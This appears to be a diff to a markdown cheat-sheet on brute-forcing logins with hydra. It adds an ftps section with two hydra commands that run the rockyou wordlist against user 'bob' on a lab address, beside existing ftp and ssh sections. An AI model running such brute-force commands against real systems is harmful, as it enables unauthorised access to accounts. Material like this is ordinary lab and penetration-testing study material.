@@ -84,6 +84,18 @@ or
 
 `hydra -l bob -P /usr/share/wordlists/rockyou.txt ftp://10.10.1.1`
 
+### ftps
+
+Using ftps is better than ftp for security.
+
+The syntax is the following when not including options:
+
+`hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.1.1 ftps`
+
+or
+
+`hydra -l bob -P /usr/share/wordlists/rockyou.txt ftps://10.10.1.1`
+
 ### ssh
 
 If a system is vulnerable to an ssh brute force (meaning if I type `ssh target_machine` and it asks for a password) and I have either a username or password, hydra can help you gain access.
